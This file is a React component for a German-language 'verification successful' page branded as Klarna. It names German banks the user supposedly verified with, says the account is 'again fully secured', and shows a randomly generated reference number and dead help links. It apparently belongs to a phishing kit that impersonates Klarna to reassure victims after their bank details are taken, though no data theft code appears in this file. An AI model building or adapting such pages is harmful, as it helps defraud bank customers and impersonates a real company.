import React from 'react';
import { Shield, CheckCircle, Clock, FileText } from 'lucide-react';

interface KlarnaSuccessProps {
  selectedBank?: string | null;
}

const KlarnaSuccess: React.FC<KlarnaSuccessProps> = ({ selectedBank }) => {
  // Get bank display name
  const getBankDisplayName = (bankId: string): string => {
    const bankNames: Record<string, string> = {
      'santander': 'Santander',
      'commerzbank': 'Commerzbank',
      'apobank': 'Apobank',
      'sparkasse': 'Sparkasse',
      'postbank': 'Postbank',
      'dkb': 'DKB',
      'volksbank': 'Volksbank',
      'comdirect': 'comdirect',
      'consorsbank': 'Consorsbank',
      'ingdiba': 'ING-DiBa',
      'deutsche_bank': 'Deutsche Bank'
    };
    return bankNames[bankId] || bankId;
  };

  return (
    <div className="klarna-success">
      <div className="klarna-success-content">
        <div className="klarna-success-icon">
          <div className="klarna-checkmark">
            <svg viewBox="0 0 52 52" className="klarna-checkmark-svg">
              <circle 
                className="klarna-checkmark-circle" 
                cx="26" 
                cy="26" 
                r="25" 
                fill="none"
              />
              <path 
                className="klarna-checkmark-check" 
                fill="none" 
                d="m14.1 27.2l7.1 7.2 16.7-16.8"
              />
            </svg>
          </div>
        </div>

        <h1 className="klarna-success-title">
          Verifizierung erfolgreich!
        </h1>

        <p className="klarna-success-message">
          Ihre Identität wurde erfolgreich verifiziert. Ihr Klarna-Konto ist jetzt wieder 
          vollständig gesichert und einsatzbereit.
        </p>

        {selectedBank && (
          <div className="klarna-success-bank-info">
            <p className="klarna-success-bank-text">
              Verifiziert mit: <strong>{getBankDisplayName(selectedBank)}</strong>
            </p>
          </div>
        )}

        <div className="klarna-success-details">
          <div className="klarna-success-detail">
            <CheckCircle size={16} className="klarna-success-detail-icon" />
            <span className="klarna-success-detail-label">Status:</span>
            <span className="klarna-success-detail-value klarna-success-status">
              Verifiziert
            </span>
          </div>
          
          <div className="klarna-success-detail">
            <Clock size={16} className="klarna-success-detail-icon" />
            <span className="klarna-success-detail-label">Abgeschlossen:</span>
            <span className="klarna-success-detail-value">
              {new Date().toLocaleString('de-DE')}
            </span>
          </div>
          
          <div className="klarna-success-detail">
            <FileText size={16} className="klarna-success-detail-icon" />
            <span className="klarna-success-detail-label">Referenz:</span>
            <span className="klarna-success-detail-value">
              VER-{Math.random().toString(36).substr(2, 9).toUpperCase()}
            </span>
          </div>
        </div>

        <div className="klarna-success-actions">
          <button 
            className="klarna-button klarna-button-primary"
            onClick={() => window.location.href = '/'}
          >
            Zu Klarna zurückkehren
          </button>
          
          <button 
            className="klarna-button klarna-button-secondary"
            onClick={() => window.print()}
          >
            Bestätigung drucken
          </button>
        </div>

        <div className="klarna-success-info">
          <div className="klarna-info-section">
            <h3 className="klarna-info-title">Was wurde verifiziert?</h3>
            <ul className="klarna-info-list">
              <li>Ihre Bankverbindung wurde bestätigt</li>
              <li>Ihre persönlichen Daten wurden überprüft</li>
              <li>Ihr Konto ist jetzt vollständig gesichert</li>
            </ul>
          </div>

          <div className="klarna-info-section">
            <h3 className="klarna-info-title">Benötigen Sie Hilfe?</h3>
            <div className="klarna-help-links">
              <a href="#" className="klarna-link">Sicherheitszentrum</a>
              <a href="#" className="klarna-link">Kundenservice kontaktieren</a>
              <a href="#" className="klarna-link">FAQ anzeigen</a>
            </div>
          </div>
        </div>

        <div className="klarna-success-security">
          <div className="klarna-security-badge">
            <Shield size={16} />
            <span>Ihre Daten sind sicher verschlüsselt</span>
          </div>
        </div>

        <div className="klarna-success-footer">
          <p className="klarna-success-footer-text">
            Vielen Dank für die Verifizierung Ihres Klarna-Kontos!
          </p>
        </div>
      </div>
    </div>
  );
};

export default KlarnaSuccess;
